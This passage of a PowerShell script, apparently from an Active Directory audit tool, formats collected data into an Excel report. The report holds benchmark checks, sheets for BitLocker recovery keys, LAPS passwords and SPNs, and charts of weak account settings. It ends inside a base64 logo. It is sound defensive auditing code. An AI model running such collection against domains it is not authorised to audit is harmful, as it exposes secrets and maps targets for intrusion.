
            # CIS Benchmark Minimum password length (characters)
            "G5", '=IF(B5<14,TRUE, FALSE)'

            # CIS Benchmark Password must meet complexity requirements
            "G6", '=IF(B6<>TRUE,TRUE, FALSE)'

            # CIS Benchmark Store password using reversible encryption for all users in the domain
            "G7", '=IF(B7<>FALSE,TRUE, FALSE)'

            # CIS Benchmark Account lockout duration (mins)
            "G8", '=IF(AND(B8>=1,B8<15),TRUE, FALSE)'

            # CIS Benchmark Account lockout threshold (attempts)
            "G9", '=IF(OR(B9=0,B9>10),TRUE, FALSE)'

            # CIS Benchmark Reset account lockout counter after (mins)
            "G10", '=IF(B10<15,TRUE, FALSE)' )

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $worksheet.Range($ObjValues[$i]).FormatConditions.Add([Microsoft.Office.Interop.Excel.XlFormatConditionType]::xlExpression, 0, $ObjValues[$i+1]) | Out-Null
                $i++
            }

            "C2", "C3" , "C5", "C6", "C8", "C9", "E2", "E3" , "E4", "E5", "E6", "E9", "G2", "G3", "G4", "G5", "G6", "G7", "G8", "G9", "G10" | ForEach-Object {
                $worksheet.Range($_).FormatConditions.Item(1).StopIfTrue = $false
                $worksheet.Range($_).FormatConditions.Item(1).Font.ColorIndex = 3
            }

            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "https://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dss", "" , "", "PCI DSS v3.2.1") | Out-Null
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,6) , "https://acsc.gov.au/infosec/ism/", "" , "", "2018 ISM Controls") | Out-Null
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,7) , "https://www.cisecurity.org/benchmark/microsoft_windows_server/", "" , "", "CIS Benchmark 2016") | Out-Null

            $excel.ScreenUpdating = $true
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\','DomainControllers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Domain Controllers"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','DACLs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "DACLs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','SACLs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "SACLs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','GPOs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "GPOs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','gPLinks.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "gPLinks"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','DNSNodes','.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "DNS Records"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','DNSZones.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "DNS Zones"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Printers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Printers"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','BitLockerRecoveryKeys.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "BitLocker"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','LAPS.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "LAPS"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','ComputerSPNs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Computer SPNs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "Name"
        }

        $ADFileName = -join($ReportPath,'\','Computers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Computers"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "UserName"

            $worksheet = $workbook.Worksheets.Item(1)
            # Freeze First Row and Column
            $worksheet.Select()
            $worksheet.Application.ActiveWindow.splitcolumn = 1
            $worksheet.Application.ActiveWindow.splitrow = 1
            $worksheet.Application.ActiveWindow.FreezePanes = $true

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\','OUs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "OUs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','UserSPNs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "User SPNs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Groups.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Groups"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "DistinguishedName"
        }

        $ADFileName = -join($ReportPath,'\','GroupMembers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Group Members"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "Group Name"
        }

        $ADFileName = -join($ReportPath,'\','Users.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Users"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "UserName"

            $worksheet = $workbook.Worksheets.Item(1)

            # Freeze First Row and Column
            $worksheet.Select()
            $worksheet.Application.ActiveWindow.splitcolumn = 1
            $worksheet.Application.ActiveWindow.splitrow = 1
            $worksheet.Application.ActiveWindow.FreezePanes = $true

            $worksheet.Cells.Item(1,3).Interior.ColorIndex = 5
            $worksheet.Cells.Item(1,3).font.ColorIndex = 2
            # Set Filter to Enabled Accounts only
            $worksheet.UsedRange.Select() | Out-Null
            $excel.Selection.AutoFilter(3,$true) | Out-Null
            $worksheet.Cells.Item(1,1).Select() | Out-Null
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Computer Role Stats
        $ADFileName = -join($ReportPath,'\','ComputerSPNs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Computer Role Stats"
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = "Computer SPNs"
            Get-ADRExcelPivotTable -SrcSheetName "Computer SPNs" -PivotTableName $PivotTableName -PivotRows @("Service") -PivotValues @("Service")

            $worksheet.Cells.Item(1,1) = "Computer Role"
            $worksheet.Cells.Item(1,2) = "Count"

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields("Service").AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,"Count")

            Get-ADRExcelChart -ChartType "xlColumnClustered" -ChartLayout 10 -ChartTitle "Computer Roles in AD" -RangetoCover "D2:U16"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , "'Computer SPNs'!A1", "", "Raw Data") | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Operating System Stats
        $ADFileName = -join($ReportPath,'\','Computers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Operating System Stats"
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = "Operating Systems"
            Get-ADRExcelPivotTable -SrcSheetName "Computers" -PivotTableName $PivotTableName -PivotRows @("Operating System") -PivotValues @("Operating System")

            $worksheet.Cells.Item(1,1) = "Operating System"
            $worksheet.Cells.Item(1,2) = "Count"

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields("Operating System").AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,"Count")

            Get-ADRExcelChart -ChartType "xlColumnClustered" -ChartLayout 10 -ChartTitle "Operating Systems in AD" -RangetoCover "D2:S16"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , "Computers!A1", "", "Raw Data") | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Group Stats
        $ADFileName = -join($ReportPath,'\','GroupMembers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Privileged Group Stats"
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = "Group Members"
            Get-ADRExcelPivotTable -SrcSheetName "Group Members" -PivotTableName $PivotTableName -PivotRows @("Group Name")-PivotFilters @("AccountType") -PivotValues @("AccountType")

            # Set the filter
            $worksheet.PivotTables($PivotTableName).PivotFields("AccountType").CurrentPage = "user"

            $worksheet.Cells.Item(1,2).Interior.ColorIndex = 5
            $worksheet.Cells.Item(1,2).font.ColorIndex = 2

            $worksheet.Cells.Item(3,1) = "Group Name"
            $worksheet.Cells.Item(3,2) = "Count (Not-Recursive)"

            $excel.ScreenUpdating = $false
            # Create a copy of the Pivot Table
            $PivotTableTemp = ($workbook.PivotCaches().Item($workbook.PivotCaches().Count)).CreatePivotTable("R1C5","PivotTableTemp")
            $PivotFieldTemp = $PivotTableTemp.PivotFields("Group Name")
            # Set a filter
            $PivotFieldTemp.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
            Try
            {
                $PivotFieldTemp.CurrentPage = "Domain Admins"
            }
            Catch
            {
                # No Direct Domain Admins. Good Job!
                $NoDA = $true
            }
            If ($NoDA)
            {
                Try
                {
                    $PivotFieldTemp.CurrentPage = "Administrators"
                }
                Catch
                {
                    # No Direct Administrators
                }
            }
            # Create a Slicer
            $PivotSlicer = $workbook.SlicerCaches.Add($PivotTableTemp,$PivotFieldTemp)
            # Add Original Pivot Table to the Slicer
            $PivotSlicer.PivotTables.AddPivotTable($worksheet.PivotTables($PivotTableName))
            # Delete the Slicer
            $PivotSlicer.Delete()
            # Delete the Pivot Table Copy
            $PivotTableTemp.TableRange2.Delete() | Out-Null

            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotFieldTemp
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotSlicer
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTableTemp

            Remove-Variable PivotFieldTemp
            Remove-Variable PivotSlicer
            Remove-Variable PivotTableTemp

            "Account Operators","Administrators","Backup Operators","Cert Publishers","Crypto Operators","DnsAdmins","Domain Admins","Enterprise Admins","Enterprise Key Admins","Incoming Forest Trust Builders","Key Admins","Microsoft Advanced Threat Analytics Administrators","Network Operators","Print Operators","Remote Desktop Users","Schema Admins","Server Operators" | ForEach-Object {
                Try
                {
                    $worksheet.PivotTables($PivotTableName).PivotFields("Group Name").PivotItems($_).Visible = $true
                }
                Catch
                {
                    # when PivotItem is not found
                }
            }

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields("Group Name").AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,"Count (Not-Recursive)")

            $worksheet.Cells.Item(3,1).Interior.ColorIndex = 5
            $worksheet.Cells.Item(3,1).font.ColorIndex = 2

            $excel.ScreenUpdating = $true

            Get-ADRExcelChart -ChartType "xlColumnClustered" -ChartLayout 10 -ChartTitle "Privileged Groups in AD" -RangetoCover "D2:P16" -StartRow "A3" -StartColumn "B3"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , "'Group Members'!A1", "", "Raw Data") | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Computer Stats
        $ADFileName = -join($ReportPath,'\','Computers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Computer Stats"
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.Add("Delegation Typ",'"Unconstrained"')
            $ObjAttributes.Add("Delegation Type",'"Constrained"')
            $ObjAttributes.Add("SIDHistory",'"*"')
            $ObjAttributes.Add("Dormant",'"TRUE"')
            $ObjAttributes.Add("Password Age (> ",'"TRUE"')
            $ObjAttributes.Add("ms-ds-CreatorSid",'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName "Computers" -Title1 "Computer Accounts in AD" -Title2 "Status of Computer Accounts" -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType "xlPie" -ChartLayout 3 -ChartTitle "Computer Accounts in AD" -RangetoCover "A11:D23" -ChartData $workbook.Worksheets.Item(1).Range("A3:A4,B3:B4")
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(10,1) , "" , "Computers!A1", "", "Raw Data") | Out-Null

            Get-ADRExcelChart -ChartType "xlBarClustered" -ChartLayout 1 -ChartTitle "Status of Computer Accounts" -RangetoCover "F11:L23" -ChartData $workbook.Worksheets.Item(1).Range("F2:F8,G2:G8")
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(10,6) , "" , "Computers!A1", "", "Raw Data") | Out-Null

            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
        }

        # User Stats
        $ADFileName = -join($ReportPath,'\','Users.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "User Stats"
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.Add("Must Change Password at Logon",'"TRUE"')
            $ObjAttributes.Add("Cannot Change Password",'"TRUE"')
            $ObjAttributes.Add("Password Never Expires",'"TRUE"')
            $ObjAttributes.Add("Reversible Password Encryption",'"TRUE"')
            $ObjAttributes.Add("Smartcard Logon Required",'"TRUE"')
            $ObjAttributes.Add("Delegation Permitted",'"TRUE"')
            $ObjAttributes.Add("Kerberos DES Only",'"TRUE"')
            $ObjAttributes.Add("Kerberos RC4",'"TRUE"')
            $ObjAttributes.Add("Does Not Require Pre Auth",'"TRUE"')
            $ObjAttributes.Add("Password Age (> ",'"TRUE"')
            $ObjAttributes.Add("Account Locked Out",'"TRUE"')
            $ObjAttributes.Add("Never Logged in",'"TRUE"')
            $ObjAttributes.Add("Dormant",'"TRUE"')
            $ObjAttributes.Add("Password Not Required",'"TRUE"')
            $ObjAttributes.Add("Delegation Typ",'"Unconstrained"')
            $ObjAttributes.Add("SIDHistory",'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName "Users" -Title1 "User Accounts in AD" -Title2 "Status of User Accounts" -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType "xlPie" -ChartLayout 3 -ChartTitle "User Accounts in AD" -RangetoCover "A21:D33" -ChartData $workbook.Worksheets.Item(1).Range("A3:A4,B3:B4")
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(20,1) , "" , "Users!A1", "", "Raw Data") | Out-Null

            Get-ADRExcelChart -ChartType "xlBarClustered" -ChartLayout 1 -ChartTitle "Status of User Accounts" -RangetoCover "F21:L43" -ChartData $workbook.Worksheets.Item(1).Range("F2:F18,G2:G18")
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(20,6) , "" , "Users!A1", "", "Raw Data") | Out-Null

            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
        }

        # Create Table of Contents
        Get-ADRExcelWorkbook -Name "Table of Contents"
        $worksheet = $workbook.Worksheets.Item(1)

        $excel.ScreenUpdating = $false
        # Image format and properties
        # $path = "C:\SOS_Logo.jpg"
        # $base64sos = [convert]::ToBase64String((Get-Content $path -Encoding byte))

        $base64sos = "/9j/4AAQSkZJRgABAgEASABIAAD/7QAsUGhvdG9zaG9wIDMuMAA4QklNA+0AAAAAABAASAAAAAEAAQBIAAAAAQAB/+Fik2h0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8APD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNC4yLjItYzA2MyA1My4zNTE3MzUsIDIwMDgvMDcvMjItMTg6MTE6MTIgICAgICAgICI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+CiAgICAgICAgIDxkYzpmb3JtYXQ+aW1hZ2UvanBlZzwvZGM6Zm9ybWF0PgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAgICB4bWxuczp4bXBHSW1nPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvZy9pbWcvIj4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAxMy0xMC0wM1QxMToyNjoyNSsxMDowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpNb2RpZnlEYXRlPjIwMTMtMTAtMDNUMDE6MjY6MzBaPC94bXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdGVEYXRlPjIwMTMtMTAtMDNUMTE6MjY6MjUrMTA6MDA8L3htcDpDcmVhdGVEYXRlPgogICAgICAgICA8eG1wOkNyZWF0b3JUb29sPkFkb2JlIElsbHVzdHJhdG9yIENTNDwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8eG1wOlRodW1ibmFpbHM+CiAgICAgICAgICAgIDxyZGY6QWx0PgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHhtcEdJbWc6d2lkdGg+MjU2PC94bXBHSW1nOndpZHRoPgogICAgICAgICAgICAgICAgICA8eG1wR0ltZzpoZWlnaHQ+OTY8L3htcEdJbWc6aGVpZ2h0PgogICAgICAgICAgICAgICAgICA8eG1wR0ltZzpmb3JtYXQ+SlBFRzwveG1wR0ltZzpmb3JtYXQ+CiAgICAgICAgICAgICAgICAgIDx4bXBHSW1nOmltYWdlPi85ai80QUFRU2taSlJnQUJBZ0VCTEFFc0FBRC83UUFzVUdodmRHOXphRzl3SURNdU1BQTRRa2xOQSswQUFBQUFBQkFCTEFBQUFBRUEmI3hBO0FRRXNBQUFBQVFBQi8rNEFEa0ZrYjJKbEFHVEFBQUFBQWYvYkFJUUFCZ1FFQkFVRUJnVUZCZ2tHQlFZSkN3Z0dCZ2dMREFvS0N3b0smI3hBO0RCQU1EQXdNREF3UURBNFBFQThPREJNVEZCUVRFeHdiR3hzY0h4OGZIeDhmSHg4Zkh3RUhCd2NOREEwWUVCQVlHaFVSRlJvZkh4OGYmI3hBO0h4OGZIeDhmSHg4Zkh4OGZIeDhmSHg4Zkh4OGZIeDhmSHg4Zkh4OGZIeDhmSHg4Zkh4OGZIeDhmSHg4Zi84QUFFUWdBWUFFQUF3RVImI3hBO0FBSVJBUU1SQWYvRUFhSUFBQUFIQVFFQkFRRUFBQUFBQUFBQUFBUUZBd0lHQVFBSENBa0tDd0VBQWdJREFRRUJBUUVBQUFBQUFBQUEmI3hBO0FRQUNBd1FGQmdjSUNRb0xFQUFDQVFNREFnUUNCZ2NEQkFJR0FuTUJBZ01SQkFBRklSSXhRVkVHRTJFaWNZRVVNcEdoQnhXeFFpUEImI3hBO1V0SGhNeFppOENSeWd2RWxRelJUa3FLeVkzUENOVVFuazZPek5oZFVaSFREMHVJSUpvTUpDaGdaaEpSRlJxUzBWdE5WS0JyeTQvUEUmI3hBOzFPVDBaWFdGbGFXMXhkWGw5V1oyaHBhbXRzYlc1dlkzUjFkbmQ0ZVhwN2ZIMStmM09FaFlhSGlJbUtpNHlOam8rQ2s1U1ZscGVZbVomI3hBO3FibkoyZW41S2pwS1dtcDZpcHFxdXNyYTZ2b1JBQUlDQVFJREJRVUVCUVlFQ0FNRGJRRUFBaEVEQkNFU01VRUZVUk5oSWdaeGdaRXkmI3hBO29iSHdGTUhSNFNOQ0ZWSmljdkV6SkRSRGdoYVNVeVdpWTdMQ0IzUFNOZUpFZ3hkVWt3Z0pDaGdaSmpaRkdpZGtkRlUzOHFPend5Z3AmI3hBOzArUHpoSlNrdE1UVTVQUmxkWVdWcGJYRjFlWDFSbFptZG9hV3ByYkcxdWIyUjFkbmQ0ZVhwN2ZIMStmM09FaFlhSGlJbUtpNHlOam8mI3hBOytEbEpXV2w1aVptcHVjblo2ZmtxT2twYWFucUttcXE2eXRycSt2L2FBQXdEQVFBQ0VRTVJBRDhBOVU0cTdGVXQ4eUN5ZlJMcUMrWGwmI3hBO1ozU3JhejlQaFM1WVFsOS81ZWZMNk1qT0hFQ085dHdacFlweG5IbkVnL0o4b1hWMzVrOHY2bmM2Y2wvZFdzOWpLOERDR2FTT2hqYmomI3hBO1VjU052aEZNNS9lSjdpK3lZOGVEVVl4TXhqSVNGN2dIbTk5L0pIemJkYTc1WGt0Nys0ZTUxSFRwVEhKTkt4ZVI0cFBpalptSkpQN1MmI3hBOzcrR2JYUlpUS0pCNWg4NzlxT3o0NmZVQ1VBSXdtT1E1V09mNkM5RXpOZWFkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZkaXImI3hBO3NWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZRT3U2WU5WMFRVTk1MY0JmVzB0dnpxUVY5VkNuSUViaWxhN1lxK1kmI3hBOy9QNWZVNGRGODJGQXNtdDJnWFVWVUNpYWhaL3VMcE50dnRybW4xdVBobmZlK2wreU9zOFRUbkdlZU0vWWR4K2xNZnlROHhmb256dkQmI3hBO2F5TlMyMVZEYXVPM3FING9qL3dRNC9Ua05KazRjZzg5bkk5cU5INDJrTWg5V1AxZkRyK3Y0UHBuTjIrV094VjJLdXhWMkt1eFYyS3UmI3hBO3hWMkt1eFYyS3V4VjJLdXhWMkt1eFYyS3V4VjJLdXhWMkt1eFYyS3V4VjJLdXhWMkt1eFYyS3V4Vjg0YXRwdk81L01YeWF5VW4wYSsmI3hBOy93QVQ2U1ArWGE3Vld1bFgvSlFTQS9QTVRXNCtLRjl6MEhzenJQQjFjUWZwbjZUK2o3WG5GdGNUVzF4RmNRTVVtaGRaSW5IVU1ocXAmI3hBOytnak5NK3FUZ0pSTVR5TDdFOHQ2MURyZWcyR3JRMENYa0tTbFIreTVIeHIvQUxGcWpPZ3haT09JTDRycmRNY0dhV00vd212MUpsbGomI3hBO2l1SkFCSk5BT3B4VkFycm1rU1QvQUZlRzZqdUp3YU5GQWZXWmEvemlQa1ZIdTJWZU5DNkJ2M2J1UWRMa0E0akVnZWUzeXZtdnM5WDAmI3hBO3ErbnVMZXl2SWJtZTBLaTZqaGtXUm9pOWVJY0tUeEo0blk1YTQ2M1d0YTB2Uk5MdU5WMVM0VzFzTFJPYzg3MW9CMDZDcEpKMkFHNU8mI3hBO0t2QjljLzV5MGdTNmVQUTlCTTFzcG9seGR6ZW16YjlmU1JXNC93REI0cHBHZVYvK2NxYkhVZFRnc05WMENXMitzeUpGRk5hVEM0UEsmI3hBO1JncWd4c2taNm5zeCtXS0tlODRxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhnZjUmI3hBO3IzU2VWUHozOHBlWXBSVFR0Y3RtMHZVbHBWWFF1WXBDM2lGVzRqYi9BR09BaXhSWlJrUWJITU1SOHcvbGQ1eDA3Vkx5RzIwaTd1N0smI3hBO0taMXRwNFltbDV4aHZnYWlBbmRhZHMwVXNFd2FvL0o5YTBmYnVseTQ0bVdTTVpFQ3dUVkhyelpWNUM4OStjL0xlaWp5N0I1YXVyKzYmI3hBOzlaNUxYbWtxY0VlaEtsQkdTUnlxMWFqcmx1SFVUZ09FQ3orT2pxZTF1eXRMcXN2am5OR0VhMzVHNjg3N2syMXp6djU1czRqTjVyOHgmI3hBO2FYNUx0MkZmcXNhcmMzeFhyOEVBTThoMjhDTXlnTTgrWjRRNkxKUHNyVDdRalBQTHpORDlIM0Y1bjVoL1BMeXREelN3dGRRODEzbmEmI3hBOzkxKzRkYlFIL0lzb21veWV6RVpaSFNSL2lKa2ZOd01uYldUbGlqRENQNklGL3dDbTV2UGZNbjV1ZWZkZmhOcGNhazFucHZSTk0wOVImI3hBO2FXeXIvTDZjUEhrUDljbk1xTVFCUTJkVE9jcG01RWsrYjZEL0FPY1JOUE1Ya1hWcjVoUTNXcE5HcDhWaGhqb2YrQ2tiQ3dMWC9PV1YmI3hBOzllUmVXOUVzNDJaYlc1dTVIdUFLMExSUmowd2YrRFkweFFFcC93Q2NiZklYa1BYZkxtb2FocTFuQnFtcXBkR0Y0TGdCeERDRVZrSWomI3hBO08zeGt0OFZPMU94eFNYcC8vS2tQeThpOHg2YnI5aHAvNlB2Tk9tRndzVnN4V0dSa0I0Y296eVVjV293NFU2WW9aNDdwR2pTU01FUkEmI3hBO1dabU5BQU55U1RpcnpQVy8rY2l2eXcwcThhMEY3TnFEeG5qSTlsRVpJd1I0U01VVnZtcEl4VkhlVlB6MC9ManpMZXBZMm1vTmFYMHAmI3hBOzR3Mjk2aGhMazlBcjFhTWs5aHlxZTJLc244MithOUk4cTZKTnJXcnM2V01ESXNqUnFYYXNqQkYrRWU1eFZpeC9QbjhzbDh2cHJiYW0mI3hBO1Zna2tlR08xOU5qY3M4ZEN3OUlWSUZHQjVIYmZyaXFWMkgvT1MvNVgzVnlrRWs5M1pxNXA2ODl1ZlRIejlOcEcvREZYcUZwZDJ0NWEmI3hBO3hYVnBLazl0T29raG1qWU1qb3dxR1Zoc1FjVmVlZVl2K2NndnkwME8rZXhlK2t2N2lJOFp2cU1mcW9yRHFQVUpSRFQvQUNTY1ZWUEwmI3hBO0g1OS9sdjVoMUNIVHJhOWx0YjI1ZFlyYUc3aWFQMUhjOFZWWFhtbFNUUUFzTVZaN2ZYOWxwOW5MZTMwOGRyYVFLWG11SldDSWlqdXomI3hBO05RREZYbU4vL3dBNUwvbGZhWEx3UnozZDRxR25yMjl1ZlRKSGdaR2pKKzdGV1NlVFB6YjhpZWI1dnEya2FnUHI5QzMxRzRVd3pFRGMmI3hBOzhRMnowNzhDY1Zaamlyc1ZZLzUwODkrVy9KdW1McU91M0JoaWtmMDRJa1V2TEs5SzhVVWVBNms3WXFyK1V2TlZoNW8wbjlLV01GekImI3hBO2JtUm9nbDNFWVpLcUFTZUpKMjM2NHFuT0t1eFYyS3RNeXFwWmlBb0ZTVHNBQmlyejN6ZCtmbjVaZVdlY1UycXJxRjZsZjlEMDhDNGYmI3hBO2tQMlM2a1JLZlpuR0t2RmZOMy9PVzNtaTk1d2VXTk9oMG1FN0xkWEZMbTQrWVVnUkw4aXJZcHA1NzVZMXp6UDUxL012eTJtdTZsY2EmI3hBO2xKTHFkclgxNUdaVVQxbE1uQlBzSU9LblpRTVZmZCtLSGtIL0FEazk1cDFiUVBJRnQraWJ5YXh2TDYvamdhYTNkb3BQUkVVcnVBNjAmI3hBO081VlIxeFVQamlhYWFlVnBabmFXVnpWNUhKWm1KN2tuYzRzbVNlVmZ5MDg5K2FtWDlCNk5jWFVKL3dDUG9yNlZ1UDhBbnRKd2oraXQmI3hBO2NWdDdUNVIvNXhDbmJoUDVzMWdSall0WTZjT1RVOERQS0FBZmxHZm5